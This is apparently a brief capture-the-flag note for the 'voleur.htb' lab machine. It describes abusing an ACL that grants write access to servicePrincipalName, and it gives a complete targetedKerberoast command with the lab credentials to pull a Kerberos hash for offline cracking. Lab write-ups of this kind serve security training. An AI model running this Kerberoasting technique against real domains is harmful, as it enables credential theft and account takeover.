#ACL 

allow us to write to `ServicePrincipleName` attribute so it became `Kerberoast`-able

```bash
/home/pix3l/tools/targetedKerberoast/targetedKerberoast.py --dc-ip 10.10.11.76 -d voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn --kerberos --dc-host DC.voleur.htb
```
will return the hash to be cracked offline.


> when using `--kerberos`  we need to specify `--dc-host`